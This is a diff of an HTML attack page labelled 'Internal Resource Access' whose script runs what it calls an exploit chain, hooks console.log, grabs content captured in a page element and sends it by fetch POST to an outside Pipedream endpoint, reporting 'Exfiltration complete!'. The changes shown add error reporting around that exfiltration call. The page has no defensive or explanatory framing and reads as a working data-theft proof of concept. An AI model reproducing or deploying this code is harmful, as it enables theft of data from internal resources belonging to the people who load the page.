@@ -9,10 +9,11 @@
     </style>
 </head>
 <body>
-    <h1>Internal Resource Access 2</h1> 
+    <h1>Internal Resource Access 3</h1> 
     
     <div class="box">
         <p id="exploit-status">Initializing exploit chain...</p>
+        <p id="details"></p>
     </div>
 
     <script>
@@ -55,7 +56,10 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ type: type, log: message })
-            }).catch(e => console.error("Exfil failed", e));
+            }).catch(e => {
+                document.getElementById('exploit-status').innerText = 'exception: ' + e + '  -  ' + e.message;
+                console.error("Exfil failed", e)
+            });
         }
 
         console.log = function(...args) {
@@ -94,13 +98,18 @@
                     console.log("Data captured in div!");
                     
                     // Send to Pipedream
-                    fetch('https://eo1b8md42oge0zj.m.pipedream.net', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ data: dataDiv.textContent })
-                    }).then(() => {
-                        document.getElementById('exploit-status').innerText = "Exfiltration complete!";
-                    });
+                    try {
+                        fetch('https://eo1b8md42oge0zj.m.pipedream.net', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ data: dataDiv.textContent })
+                        }).then(() => {
+                            document.getElementById('exploit-status').innerText = "Exfiltration complete!";
+                        });
+                    } catch (e) {
+                        console.log('exception: ' + e + '  -  ' + e.message)
+                        document.getElementById('exploit-status').innerText = 'exception: ' + e + '  -  ' + e.message;
+                    }
                 }
             }, 2000);
         }, 7000);
